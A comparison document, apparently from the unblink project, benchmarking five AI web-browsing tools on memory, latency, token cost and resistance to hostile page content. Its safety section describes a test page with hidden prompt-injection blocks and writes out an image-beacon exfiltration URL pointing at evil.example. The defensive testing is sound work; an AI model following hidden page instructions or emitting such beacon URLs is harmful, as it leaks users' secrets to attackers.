# unblink vs. other AI web-browsing tools

*Comparison as of July 2026. Every project here moves fast — versions and
numbers below will drift. Performance, memory, and token figures for **all
five tools** (plus a raw headless-Chromium baseline) are **measured locally
by one harness on identical fixtures** and reproducible with
`make crossbench` — see [Measured head-to-head](#measured-head-to-head).
Vendor-published claims survive only where our fixtures don't cover a
capability, and are labeled as such.*

Tools that give AI agents access to the web differ along two axes:

1. **What executes the page's JavaScript.** A real browser (Playwright MCP,
   Charlotte), a from-scratch engine embedding real V8 (Obscura, Lightpanda),
   or a pure-Go interpreter with a hand-rolled DOM (unblink).
2. **What the model receives.** Automation primitives over a live DOM
   (Obscura, Lightpanda), accessibility-tree snapshots (Playwright MCP), a
   typed structural decomposition (Charlotte), or reduced, token-budgeted
   Markdown (unblink).

unblink sits at the far end of both axes. It is not a browser-automation tool
that happens to speak MCP; it is a *semantic reduction* tool — fetch a page,
parse it, optionally run its JavaScript, throw away everything that exists
only for human eyes, and hand the model clean Markdown under a token budget.
An AI doesn't need pixels; it needs structured meaning. That bet buys a single
static binary with no browser install and some safety properties none of the
tools below have — and it forfeits real-browser fidelity. This document is
explicit about both directions.

## At a glance

| | **unblink** | **Playwright MCP** | **Charlotte** | **Obscura** | **Lightpanda** |
|---|---|---|---|---|---|
| Engine | Pure Go, hand-rolled DOM (no browser engine) | Real Chrome / Firefox / WebKit / Edge | Real headless Chromium (Puppeteer/CDP) | From-scratch engine in Rust | From-scratch engine in Zig |
| JavaScript | goja (Go interpreter), opt-in `--js`; renders React/Vue/Preact/Svelte/Lit via a flat-DOM model | Full (real browser) | Full (real Chromium) | Embedded V8 (our React/Vue fixtures render; the Lit one came back empty) | Embedded V8; beta — "hundreds of Web APIs" unimplemented (though it rendered all four of our fixtures) |
| Agent protocol | MCP (stdio), 14 tools | MCP (Node), 50+ tools | MCP (Node ≥ 20), 43 tools in profiles (7/23/43) | CDP (Puppeteer/Playwright drop-in) + MCP (11 tools) | CDP (WebSocket) + MCP (stdio) + CLI agent mode |
| Page representation | Reduced Markdown (article or full page) + structured tools (outline, links, forms, JSON-LD/tables) | Accessibility-tree snapshots | Typed page decomposition, 3 detail levels, targeted `find` queries | DOM automation primitives (navigate/click/fill/evaluate) | DOM automation primitives; some semantic extraction |
| Screenshots / pixels | No — permanent non-goal | Yes, plus video, tracing, PDF export | Yes (real Chromium) | Not a focus | No — no graphical rendering |
| Install footprint | One static binary (linux/darwin/windows), nothing else; ~36 MB, ~26 MB idle RSS ([measured](#measured-footprint)) | Node + full browser install | Node + Chromium (npm or Docker) | ~147 MB of binaries; [measured](#measured-footprint): 8 MB idle RSS, 2 ms cold start — leaner than its own claims | ~138 MB single binary; [measured](#measured-footprint): 15 MB idle RSS, 5 ms cold start; no native Windows, glibc-only Linux |
| Token efficiency | Core design: token-budgeted, cursor-paginated Markdown; cheap `browse`/`find` orientation. [Measured](#token-cost-per-page): reads a nav-heavy portal for ~1% of a snapshot's tokens | Verbose — [measured](#token-cost-per-page): ×88 unblink's read on a nav-heavy portal; no orientation surface | Core design: orientation 23–178× smaller than a11y-tree dumps. [Measured](#token-cost-per-page): orientation 1.3–2× unblink's `browse`; *reading* costs snapshot-scale | Not a design concern — [measured](#token-cost-per-page): its snapshot truncates at ~4 KB and never reaches the article on a nav-heavy page | Not a design concern, though its `markdown` tool is genuinely dense — [measured](#token-cost-per-page): cheapest column on small clean pages, ×68 unblink on a nav-heavy portal (no reduction, budget, or orientation) |
| Sessions | Cookies + history + persistent live JS runtime per session | Real browser profile, tabs, storage | Persistent Chromium session, stable hashed element IDs, structural diffs | Fast-boot ephemeral sessions | CDP sessions |
| Agent-safety defaults | SSRF dial guard + untrusted-content fence + origin-scoped credentials, all on by default; [measured](#content-boundary-what-reaches-the-model): only tool that fences content as untrusted and defangs image-beacon exfiltration to inert text | — | Chromium sandbox on by default | Stealth / anti-fingerprinting, tracker blocking (secures the browser, not the content boundary; [measured](#content-boundary-what-reaches-the-model): no untrusted-content fence) | robots.txt respect, proxy support ([measured](#content-boundary-what-reaches-the-model): leaks all hidden text + a live image-beacon, no fence) |
| License | MIT | Apache-2.0 | MIT | Apache-2.0 | AGPL-3.0 |
| Maturity (07/2026) | v0.17.1 | Mature incumbent (in GitHub Copilot's coding agent) | v0.6.3 (npm) | v0.1.9 | Beta |

## The tools

### Playwright MCP

Microsoft's MCP server over Playwright: a real Chrome, Firefox, WebKit, or
Edge, exposed to the model as structured accessibility-tree snapshots rather
than screenshots. 50+ tools cover navigation, forms, tabs, network mocking,
storage, tracing, video, screenshots, PDF export, and test assertions. It is
the incumbent — GitHub Copilot's coding agent ships with it.

**Where it beats unblink:** everything that needs a real browser. Perfect
JS/CSS fidelity, real layout and geometry, screenshots and video, E2E testing
against the app you're building, sites gated by serious anti-bot
(Turnstile-class challenges unblink explicitly cannot pass). If the task is
"verify this UI change renders correctly," there is no substitute.

**What it costs:** a Node runtime plus a full browser install, the heaviest
per-page resource footprint here, and token-verbose snapshots — Playwright's
own docs steer token-sensitive workflows toward its CLI instead. Nothing in
its output model reduces a page to meaning; the model wades through the
accessibility tree itself. [Measured](#token-cost-per-page): reading a
nav-heavy portal costs ×88 unblink's reduced article, there is no cheap
orientation call, and peak memory under a page workload runs ~7× unblink's
([footprint](#measured-head-to-head)). Its per-call latency, though, is
excellent — a warm browser turns pages around in ~20 ms
([render speed](#render-speed)).

### Charlotte

The closest project to unblink in spirit, with the opposite architecture. It
keeps a persistent real headless Chromium (via Puppeteer/CDP) and puts a
token-efficiency layer on top: pages decompose into a typed structure
(landmarks, headings, interactive elements, forms) at three detail levels,
agents pull specifics with `find` queries, and element IDs are stable hashes
that survive minor DOM mutation. 43 tools, loaded in profiles so small
workflows don't pay for the full set.

**Where it beats unblink:** full Chromium fidelity under the efficient
surface — any page Chrome can run, Charlotte can represent, including
screenshots when the agent needs eyes. Its interactive-element model
(stable IDs, structural diffs) is richer for long multi-step UI driving than
unblink's selector-based `controls`/`interact`.

**What it costs:** the Chromium dependency (Node ≥ 20 plus a browser, or a
Docker image) and Chromium's memory profile per session. It optimizes what
the *model* pays per page, not what the *host* pays to run the browser. Young
project (v0.6.3 on npm). [Measured](#token-cost-per-page): the efficiency
layer earns its keep on *orientation* (1.3–2× unblink's `browse`, far below a
raw snapshot) — but actually *reading* a page's prose requires its `full`
detail level, which costs about what a Playwright snapshot costs (its
`summary` level truncates article text; sentinel-verified by the harness).

### Obscura

A from-scratch headless browser in Rust with V8 embedded, positioned as a
drop-in replacement for headless Chrome: existing Puppeteer/Playwright
scripts work over CDP, and an MCP server exposes 11 automation tools
(`browser_navigate`, `browser_click`, `browser_fill`, `browser_evaluate`,
`browser_wait_for`, …). Claims 30 MB memory and sub-50 ms session boot versus
200+ MB and seconds for headless Chrome — [measured](#measured-footprint),
it beats its own claims: 8 MB idle PSS and a 2 ms cold start, the leanest and
fastest-booting column in the harness. Also ships a `--stealth` mode
(per-session fingerprint randomization, ~3,520 tracker domains blocked).

**Where it beats unblink:** real V8 means real-world JS compatibility beyond
what goja reaches, at a footprint far below Chrome's; CDP compatibility means
the whole Puppeteer/Playwright ecosystem just works; stealth tooling for
scraping-adjacent work is a first-class feature unblink deliberately keeps
minimal (`--tls-mimic` is best-effort, and evading bot detection is not a
goal).

**What it costs:** it hands the agent a browser, not meaning — the model gets
automation primitives and raw DOM access, and token-efficient representation
is its problem. [Measured](#token-cost-per-page): its `browser_snapshot`
hard-truncates at ~4 KB with no continuation mechanism, so on a nav-heavy
portal the article never makes it into the output at all, and on a long read
the one-shot buys only the first half of the text; the whole document takes
`browser_markdown` with an explicit size cap. There is no orientation
surface, and no content-boundary hardening — [measured](#content-boundary-what-reaches-the-model),
it passes all three hidden-instruction blocks straight to the model, emits a
live image-beacon URL through its `browser_markdown` read, and returns the raw
byte stream on a PDF. Very early (v0.1.9) — our React and Vue fixtures
rendered, the Lit one came back empty ([render speed](#render-speed)).

### Lightpanda

A ground-up browser engine in Zig with V8, aimed at headless automation and
AI agents — no Chromium, no WebKit, no graphical rendering. Speaks CDP over
WebSocket (Puppeteer/Playwright compatible), MCP over stdio, and has a CLI
agent mode. Claims ~16× less memory and ~9× faster than headless Chrome on
its 100-page benchmark — [measured](#measured-footprint) here at 15 MB idle
(~8× under the raw Chromium baseline) with 1–11 ms page turnaround, so the
direction of the claim holds.

**Where it beats unblink:** real V8 compatibility and the CDP ecosystem, like
Obscura, in a single binary. It rendered all four of our fixtures — including
the SPAs, at 3–11 ms each, the fastest render column in the harness
([render speed](#render-speed)) — and its `markdown` tool is the cheapest
read on small clean pages. Its trajectory is "Chrome-class engine without
Chrome's weight," which covers automation use cases unblink never will.

**What it costs:** it is explicitly beta — hundreds of Web APIs
unimplemented, some sites still crash — so today its practical coverage of
the JS web is a moving target, much like unblink's flat-DOM model but without
the static-reduction fallback unblink leans on when JS isn't needed. And its
`markdown` is *rendering*, not reduction: no article extraction, token
budget, pagination, or orientation surface, so a nav-heavy portal costs ×68
unblink's read ([token cost](#token-cost-per-page)), and — like Obscura — no
content-boundary hardening ([measured](#content-boundary-what-reaches-the-model):
all hidden text and a live image-beacon pass through, and PDFs come back
empty). Platform constraints (no native Windows, glibc-only Linux) and
AGPL-3.0 licensing may matter for embedding.

## How unblink differs

unblink refuses the premise the other four share: that an agent needs a
browser. Its pipeline — fetch, parse HTML5, optionally execute JS against a
hand-rolled DOM, reduce, emit Markdown — never computes a pixel. That single
decision drives everything distinctive about it, good and bad.

**What the bet buys:**

- **Zero-dependency deployment.** One static pure-Go binary (no cgo, no
  Chromium, no Node, no V8) cross-compiled for linux/darwin/windows on
  amd64/arm64. There is nothing to install next to it and no browser process
  to babysit.
- **Meaning, not markup.** `read` returns reduced, sanitized Markdown under
  an explicit token budget with cursor pagination — never an unbounded blob.
  `browse` gives a ~free orientation pass; `find`, `links`, `forms`, `data`
  (JSON-LD / tables / microdata) answer questions without shipping the page.
  PDFs, RSS/Atom/JSON feeds, and images are handled transparently by the same
  `read` tool.
- **Agent-trust hardening no one else has.** Returned content is treated as
  untrusted *by the model*: wrapped in a provenance fence so it reads as data
  rather than instructions, human-hidden text stripped, Markdown image
  beacons (a zero-click exfiltration channel) defanged — on by default.
  Every fetch, including page-JS subrequests, sits behind an SSRF dial guard
  checked against resolved IPs. Credentials are origin-pinned and stripped on
  any cross-origin redirect. The other tools secure the *browser*; unblink
  also hardens the *content boundary* between the web and the model.
- **Discovery built in.** `map` (sitemap harvest + bounded same-origin
  crawl), `site` (robots.txt/llms.txt surfaced as context, never enforced),
  and opt-in `search` make it a research tool, not only a page loader.

**What it forfeits:**

- **JS compatibility has a ceiling.** goja is not V8. The flat-DOM model
  renders mainstream React/Vue/Preact/Svelte/Lit apps, but layout/geometry
  are constant stubs, and canvas/WebGL, Workers, WebSocket, and true
  Shadow-DOM encapsulation are permanent non-goals. Pages whose content
  depends on those won't fully materialize.
- **No pixels, ever.** No screenshots, no visual verification, no "does this
  look right" — by design.
- **An anti-bot ceiling.** `--tls-mimic` gets past naive fingerprint checks
  and the engine clears trivial JS interstitials, but Turnstile-class
  interactive challenges and server-side proof-of-work are out of scope.

## Which tool when

- **Screenshots, E2E testing, pixel-perfect fidelity, hostile anti-bot** →
  Playwright MCP. It's a real browser; nothing else here is.
- **Real-Chromium coverage with a token-efficient agent surface** →
  Charlotte. Chromium fidelity underneath, structured economy on top.
- **A low-footprint CDP drop-in for existing Puppeteer/Playwright automation**
  → Obscura (or Lightpanda, accepting beta coverage and AGPL). Real V8
  without Chrome's weight.
- **Reading, extracting, and researching the web for a model at minimal
  token cost, footprint, and attack surface** → unblink. Content for
  reasoning, not automation fidelity.

These compose: an agent can use unblink for the hundred pages it reads and a
real browser for the one page it must drive or see.

## Measured head-to-head

Every tool below is driven the way a real agent drives it — spawned as an MCP
server over stdio, the `initialize` handshake timed, then `tools/call` —
through **identical local fixtures**: a static article, real React / Vue / Lit
SPAs, and three static token-metric pages (a junk-laden article, a long read,
and a generated ~90 KB nav-heavy portal). Playwright MCP and Charlotte drive
the **same Chromium binary** as the raw chromedp baseline, at their default
settings and pinned versions; Obscura and Lightpanda are their own engines
(that's the point of them). Memory is **PSS** (proportional set size —
shared pages counted once) summed over each tool's whole process tree, so a
multi-process browser isn't double-counted. Every counted output is
**sentinel-validated** — a tool result missing the fixture's known content
(and, for whole-document reads, its document-tail content) prints as `fail`,
never as a number, so an error message or a silent truncation can't
masquerade as efficiency. Reproduce with `make crossbench` (see
[`scripts/membench`](../scripts/membench), a separate module so its
dependencies never touch the published binary).

Measured 2026-07-03 · WSL2 (Linux 6.6, 4 vCPU / 5.8 GiB) · unblink v0.17.1 ·
Chromium 140.0.7339.16 · @playwright/mcp 0.0.77 (Playwright 1.62.0-alpha) ·
charlotte 0.6.3 · obscura 0.1.9 · lightpanda nightly 1.0.0-7742 · median of
3 runs:

### Measured footprint

| Metric | unblink | Chromium (headless) | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|---|
| Binary on disk | 36 MB | 439 MB | npx pkg + Chromium | npx pkg + Chromium | 147 MB | 138 MB |
| Cold start → MCP ready | 16 ms | 153 ms¹ | 514 ms | 555 ms | 2 ms | 5 ms |
| First page ready | ~1 ms | 190 ms | 206 ms | 200 ms | 9 ms | ~1 ms |
| Idle RSS (post-init) | 26 MB | 123 MB | 135 MB | 112 MB | 8 MB | 15 MB |
| Peak RSS (sequential renders) | 42 MB | 149 MB | 298 MB | 270 MB | 13 MB | 17 MB |
| Peak RSS (8 concurrent) | 43 MB | 245 MB | n/a² | n/a² | n/a² | n/a² |
| Fixtures fully rendered (of 4) | 4 | 4 | 4 | 4 | 3³ | 4 |

¹ the raw baseline's "ready" is a blank CDP target, not an MCP handshake.
² one browsing context per server — pipelined navigations would corrupt each
other, so no number is reported; unblink dispatches concurrent MCP requests on
a single stdio connection, the raw baseline opens tabs.
³ the Lit fixture navigated but produced no content (custom-element /
Shadow-DOM gap); React and Vue rendered.

Three readings. **Against the browser-backed tools**, unblink's pitch holds:
it answers its first read in ~17 ms total while they pay ~0.5 s of Node+MCP
start plus ~200 ms of browser/tab work (npx cache warm; package download
excluded), idles at ~a fifth of their footprint, and peaks at 42 MB against
their ~270–300 MB — serializing a11y trees or typed decompositions on top of
the browser costs real memory above even the raw baseline's 149 MB.
**Against the from-scratch engines, unblink no longer holds the footprint
floor** — an idle Obscura is 8 MB and Lightpanda 15 MB, both under unblink's
26 MB, and both cold-start faster. Their bet (rebuild the browser smaller)
and unblink's (don't ship a browser at all) land in the same weight class;
what separates them is what the model receives — see the
[token table](#token-cost-per-page) — and unblink's content-boundary
hardening. **Under load**, all three lightweight engines stay flat (13–42 MB
peaks), and unblink holds its 43 MB even at 8-way concurrency because each
render's goja heap is bounded and torn down after the snapshot.

### Render speed

Per-call latency, URL → that tool's page-ready output, on a cache-missed URL
each iteration. Each column uses the tool's **own readiness definition**:
unblink's number is the full `read` (fetch, parse, JS render with its ~60 ms
settle heuristic, semantic reduction, Markdown emit); the raw Chromium
baseline opens a fresh tab and gets a settle window matched to unblink's; the
MCP browser tools navigate a warm tab and serialize at their defaults (load
event, no settle — content presence on these fixtures is sentinel-verified).

| Page | unblink | Chromium (headless) | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|---|
| Static / server-rendered article | ~1 ms | ~98 ms | ~19 ms | ~13 ms | ~4 ms | ~1 ms |
| React SPA render | ~201 ms | ~102 ms | ~22 ms | ~16 ms | ~12 ms | ~9 ms |
| Vue SPA render | ~199 ms | ~105 ms | ~23 ms | ~16 ms | ~13 ms | ~11 ms |
| Lit SPA render | ~201 ms | ~101 ms | ~21 ms | ~15 ms | (~5 ms)¹ | ~3 ms |
| Throughput (mixed corpus, sequential) | ~5 pages/s | ~10 pages/s | ~50 pages/s | ~64 pages/s | ~117 pages/s | ~162 pages/s |

¹ call timing only — Obscura's Lit output carried no content (see footprint
table), so this is not a comparable render.

Two honest halves, sharper than before. On **static pages** — the bulk of
what an agent reads — unblink and Lightpanda share the floor at ~1 ms; no
browser round trip at all. On **per-call SPA latency unblink is the slowest
column here**: goja is a tree-walking interpreter with a deliberate settle
window, and it builds and tears down an isolated JS runtime per one-shot
render, while a warm Chromium turns the same navigation around in ~20 ms and
the embedded-V8 engines in ~3–13 ms. That trade is intentional — bounded
memory and isolation over a resident renderer — but it is a trade, and this
table is where it shows. The full picture pairs this table with the next
one: a page an agent reads costs latency *once* but tokens *every time the
model re-reads its context*.

### Token cost per page

What the agent's context window pays, per abstract task, counted with an
offline o200k_base BPE tokenizer (raw bytes alongside — Claude's tokenizer is
not public, but ratios are stable across modern BPE tokenizers). Tasks:
`read-article` is each tool's canonical way to put the page's content in
front of the model (unblink: default article-mode `read`; Playwright and
Obscura: navigate + snapshot; Charlotte: navigate at `full` detail — its
`summary` level truncates prose, sentinel-verified; Lightpanda: its
`markdown` tool); `read-full` retrieves the *whole* document, tail-verified
(unblink follows its pagination cursors to exhaustion, Obscura needs
`browser_markdown` with an explicit size cap — each tool's documented
continuation mechanism — so a budget cap or silent truncation can't
masquerade as efficiency); `orient` is the cheapest "what's on this page"
call. The three token fixtures are static pages, so JS-coverage differences
can't distort the metric.

| Task · fixture | unblink | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|
| read-article · junky article | 374 (1.8 KB) | 952 (3.5 KB) ×2.5 | 1,048 (3.8 KB) ×2.8 | 534 (2.4 KB) ×1.4 | 455 (2.1 KB) ×1.2 |
| read-article · long read | 1,557 (7.6 KB) | 2,080 (9.0 KB) ×1.3 | 1,952 (8.7 KB) ×1.3 | 907 (4.1 KB) ×0.6¹ | 1,503 (7.4 KB) ×1.0 |
| read-article · nav-heavy portal | **297 (1.4 KB)** | 26,182 (92.0 KB) ×88 | 27,164 (89.8 KB) ×91 | fail¹ | 20,328 (63.4 KB) ×68 |
| read-full · junky article | 538 (2.4 KB) | 952 ×1.8 | 1,048 ×1.9 | 497 ×0.9 | 455 ×0.8 |
| read-full · long read | 1,577 (7.7 KB) | 2,080 ×1.3 | 1,952 ×1.2 | 1,710 ×1.1 | 1,503 ×1.0 |
| read-full · nav-heavy portal | 15,294 (48.9 KB, 3 calls) | 26,182 ×1.7 | 27,164 ×1.8 | 11,865 ×0.8 | 20,328 ×1.3 |
| orient · junky article | 270 (882 B) | n/a | 379 ×1.4 | n/a | n/a |
| orient · long read | 339 (1.2 KB) | n/a | 436 ×1.3 | n/a | n/a |
| orient · nav-heavy portal | 369 (1.2 KB) | n/a | 745 ×2.0 | n/a | n/a |

¹ Obscura's `browser_snapshot` hard-truncates at ~4 KB. On the long read the
cut lands mid-article, so its ×0.6 one-shot buys roughly the *first half* of
the text — the read-full row is its complete-document cost. On the nav-heavy
portal the first 4 KB is all navigation junk and the article never appears,
so the read fails outright.

The shape of the result: on a **clean long-form page** everyone lands within
~1.3× of everyone — there is little junk to strip, and every representation
carries the same prose. On a **nav-heavy portal** — mega-menus, footers,
trending rails, the shape of most commercial pages — semantic reduction is
worth **~two orders of magnitude**: 297 tokens for the article vs. ~20–27k
for any full-page representation, *including Lightpanda's Markdown* (×68) —
rendering a page as Markdown is not the same as reducing it to the part
worth reading. Even unblink's *cursor-exhausted whole page* costs ~1.7× less
than a snapshot, because Markdown with duplicate-block suppression is a
denser encoding than an a11y tree. Playwright MCP, Obscura, and Lightpanda
have **no orientation surface** — a full-page representation is the only
representation. Charlotte's orientation is genuinely cheap (its design goal,
delivered), but *reading* prose through it costs snapshot-scale tokens. And
where there's nothing to strip, the from-scratch engines undercut unblink —
×0.8–0.9 on the junky article's full read above, down to ×0.2–0.5 for
Lightpanda on the tiny SPA fixtures (not shown): unblink's provenance fence
and pagination footer are a fixed overhead that only pays for itself once
pages carry junk worth stripping, which most commercial pages do.

**Honest caveats.** This is not a like-for-like capability comparison — the
browser columns do full layout, paint, and real-DOM interaction (and can
screenshot); a Playwright snapshot and an Obscura/Lightpanda DOM carry
interaction affordances (element refs) unblink's Markdown doesn't; Charlotte
was measured at the detail levels its own schema recommends for each task.
The from-scratch engines are early (Obscura v0.1.9, Lightpanda beta), so
their columns describe today's builds, not their trajectories. The numbers
are machine-specific and reflect these fixtures, not the whole web. They are
the floor of what a real browser costs, not a claim that unblink *replaces*
one — see [Which tool when](#which-tool-when).

### Content boundary (what reaches the model)

Footprint and tokens are cost metrics; this one is a *safety* metric. Every
other tool secures the *browser* (sandbox, stealth, tracker blocking); unblink
also hardens the boundary between untrusted web content and the model. To make
that concrete rather than asserted, `make crossbench ARGS="-safety"` drives each
tool's `read-article` against a fixture page that carries three
hidden-instruction blocks — a `display:none` div, an `aria-hidden` span, and
an off-screen (`left:-9999px`) div, each with a distinct marker — plus an image
whose URL smuggles a secret:
`<img src="https://evil.example/beacon.png?leak=SECRET-TOKEN-42">`. That image
is a real zero-click exfiltration channel: a client that auto-renders a
Markdown `![](url)` fetches the URL, and the secret leaves with the request.
Reading that page (and a one-page PDF) through each tool's read surface:

| Behavior | unblink | Playwright MCP | Charlotte | Obscura | Lightpanda |
|---|---|---|---|---|---|
| Hidden-instruction blocks leaked (of 3) | 1 | 2 | 1 | 3 | 3 |
| Image-beacon exfiltration URL | **defanged**¹ | dropped | dropped | dropped² | live `![](url)` |
| Output fenced as untrusted | **yes** | no | no | no | no |
| One-page PDF | **clean text** | other³ | other³ | raw `%PDF` bytes² | empty |

¹ unblink alone rewrites the image to inert text `[image: … — url]`: the URL
stays *visible* as data (auditable) but a client won't auto-fetch it. The
others that show "dropped" simply omit the image from their structured/plain
read; Lightpanda's Markdown emits it live.
² measured on Obscura's plain-text snapshot; its `browser_markdown` (the
token-dense read it recommends) instead emits the beacon **live** and dumps the
raw PDF bytes.
³ navigating a browser tool to a PDF yields neither extracted text nor raw
bytes — a viewer/download shell the model can't read as content.

Two properties are unique to unblink and clean. **It is the only tool that
fences its output** as untrusted data — an `[UNTRUSTED WEB CONTENT …]` wrapper
with a random marker, so injected imperatives read as data, not instructions,
*regardless of what slipped past extraction*. And **it is the only tool that
turns the PDF into readable text** (the others render what a browser renders;
unblink fetches and parses, so PDFs, feeds, and images go through the same
`read`).

The **hidden-text** picture is more of a spectrum than a win: the raw DOM dumps
(Obscura, Lightpanda) leak all three blocks, the structured surfaces (unblink's
reduction, Playwright's a11y tree, Charlotte's decomposition) each incidentally
drop one or two, and none is airtight — unblink itself leaks the off-screen
block through its *default article* read (though `display:none` and
`aria-hidden` are always stripped, and `mode:"full"` strips all three; the
harness exists to catch exactly this, and article-mode off-screen stripping is
worth tightening). What makes unblink's posture different isn't a perfect
filter — it's that the fence backstops whatever leaks, and the beacon is defanged
rather than dropped or fired.

This is the crux of the differentiation. Obscura and Lightpanda are lean
real-browser *automation* engines — richer interaction surfaces than unblink
(multi-tab, storage-state replay, stealth, CSS-schema extraction) and real V8.
They compete with Playwright MCP, a lighter CDP drop-in. unblink competes on
the content boundary itself: reduce the page to meaning, treat what crosses into
the model as untrusted, and cover the non-HTML web — the things a faithful DOM,
by construction, does not do.

## Sources

- unblink — this repository ([README](../README.md),
  [architecture](architecture.md))
- Playwright MCP — <https://github.com/microsoft/playwright-mcp>,
  <https://playwright.dev/mcp/introduction>
- Charlotte — <https://github.com/TickTockBent/charlotte>
- Obscura — <https://github.com/h4ckf0r0day/obscura>, <https://obscura.sh>
- Lightpanda — <https://github.com/lightpanda-io/browser>,
  <https://lightpanda.io>
